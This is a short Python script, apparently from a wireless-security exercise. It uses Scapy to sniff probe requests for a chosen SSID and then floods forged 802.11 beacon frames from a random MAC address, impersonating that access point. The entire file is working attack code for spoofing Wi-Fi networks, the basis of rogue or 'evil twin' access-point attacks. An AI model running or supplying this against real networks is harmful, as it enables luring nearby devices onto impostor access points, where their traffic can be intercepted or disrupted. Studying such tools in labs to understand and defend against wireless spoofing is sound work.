# This script listen for probe request for a specific SSID,
# and then send beacons as if it was this AP.
# 
# To stop the script, use ctrl+c
# Usage: put ans SSId as argument

from scapy.all import *
from sys import argv
import os

# Set interface
iface = "wlan0mon"
ssid = ""

if __name__ == "__main__":
    # Test for argument
    if len(argv) < 2 or argv[1] == "":
        print("Please provide a ssid as an argument")
        exit(1)
    else:
        ssid = argv[1]

    # Start the packet sniffer, and exit when the SSID is found in a probe request
    sniff(iface=iface, stop_filter=lambda x: x.haslayer(Dot11ProbeReq) and x.info.decode("UTF-8") == ssid)
        
    print("SSID %s found, sending packets..." % (ssid))

    # Compute fake mac addresse
    sender_mac = RandMAC()

    # 802.11 frame creation
    # Subtype 8 = beacon, send broadcast
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)

    # Beacon layer
    beacon = Dot11Beacon()

    # Adding ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid

    # send the frame every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=iface, loop=1)